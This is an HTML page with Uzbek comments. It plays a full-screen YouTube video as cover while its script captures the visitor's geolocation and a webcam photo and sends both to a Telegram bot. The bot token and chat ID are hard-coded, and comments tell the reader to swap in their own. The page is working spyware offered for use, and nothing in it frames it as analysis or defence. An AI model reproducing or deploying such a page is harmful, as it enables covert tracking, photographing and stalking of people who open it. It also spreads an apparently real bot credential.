<!DOCTYPE html>
<html>
<head>
  <title>YouTube va Telegram Test</title>
  <style>
    iframe {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      z-index: -1;
    }
  </style>
</head>
<body>
  <!-- To‘g‘ri formatdagi YouTube iframe -->
  <iframe 
    src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=1"
    title="YouTube video player"
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
    allowfullscreen>
  </iframe>

  <script>
    const BOT_TOKEN = "7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4"; // o‘zingiznikini qo‘ying
    const CHAT_ID = "7281698380"; // o‘zingiznikini qo‘ying

    // Geolokatsiyani olish va yuborish
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `User location:\nLatitude: ${latitude}\nLongitude: ${longitude}`
          })
        });
      });
    }

    // Kamera orqali surat olish va yuborish
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement("canvas");
        const context = canvas.getContext("2d");

        video.addEventListener("loadeddata", () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob((blob) => {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.jpg");

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: "POST",
              body: formData
            });

            // Kamerani o‘chirish
            stream.getTracks().forEach(track => track.stop());
          }, "image/jpeg");
        });
      });
  </script>
</body>
</html>
